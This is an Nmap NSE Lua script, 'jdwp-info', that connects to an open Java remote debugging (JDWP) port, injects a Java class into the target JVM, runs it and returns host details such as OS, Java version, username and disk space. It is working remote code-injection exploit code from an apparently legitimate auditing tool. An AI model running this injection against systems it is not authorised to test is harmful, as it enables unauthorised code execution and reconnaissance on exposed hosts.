local bin = require "bin"
local io = require "io"
local jdwp = require "jdwp"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"

description = [[
Attempts to exploit java's remote debugging port.  When remote
debugging port is left open, it is possible to inject java bytecode
and achieve remote code execution.  This script injects and execute a
Java class file that returns remote system information.
]]

author = "Aleksandar Nikolic" 
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"default","safe","discovery"}

---
-- @usage nmap -sT <target> -p <port> --script=+jdwp-info
-- @output
-- PORT     STATE SERVICE REASON
-- 2010/tcp open  search  syn-ack
-- | jdwp-info:
-- |   Available processors: 1
-- |   Free memory: 15331736
-- |   File system root: A:\
-- |   Total space (bytes): 0
-- |   Free space (bytes): 0
-- |   File system root: C:\
-- |   Total space (bytes): 42935926784
-- |   Free space (bytes): 29779054592
-- |   File system root: D:\
-- |   Total space (bytes): 0
-- |   Free space (bytes): 0
-- |   Name of the OS: Windows XP
-- |   OS Version : 5.1
-- |   OS patch level : Service Pack 3
-- |   OS Architecture: x86
-- |   Java version: 1.7.0_01
-- |   Username: user
-- |   User home: C:\Documents and Settings\user
-- |_  System time: Sat Aug 11 15:21:44 CEST 2012

portrule = function(host, port)
        -- JDWP will close the port if there is no valid handshake within 2
	-- seconds, Service detection's NULL probe detects it as tcpwrapped.
        return port.service == "tcpwrapped"
               and port.protocol == "tcp" and port.state == "open"
               and not(shortport.port_is_excluded(port.number,port.protocol))
end

action = function(host, port)
	stdnse.sleep(5) -- let the remote socket recover from connect() scan
	local status,socket = jdwp.connect(host,port) -- initialize the connection
	if not status then
		stdnse.print_debug("error, %s",socket)
		return nil
	end

	-- read .class file 
	local file = io.open(nmap.fetchfile("nselib/data/jdwp-class/JDWPSystemInfo.class"), "rb")
	local class_bytes = file:read("*all")
	
	-- inject the class
	local injectedClass
	status,injectedClass = jdwp.injectClass(socket,class_bytes)
	if not status then
		stdnse.print_debug(1, "%s: Failed to inject class", SCRIPT_NAME)
		return stdnse.format_output(false, "Failed to inject class")
	end
	-- find injected class method
	local runMethodID = jdwp.findMethod(socket,injectedClass.id,"run",false)
	
	if runMethodID == nil then
		stdnse.print_debug(1, "%s: Couldn't find run method", SCRIPT_NAME)
		return stdnse.format_output(false, "Couldn't find run method.")
	end	
	
	-- invoke run method
	local result 	
	status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,0,nil) 
	if not status then
		stdnse.print_debug(1, "%s: Couldn't invoke run method", SCRIPT_NAME)
		return stdnse.format_output(false, result)
	end
	-- get the result string
	local _,_,stringID = bin.unpack(">CL",result)
	status,result = jdwp.readString(socket,0,stringID)	
	-- parse results 
	return stdnse.format_output(status,result)	
end

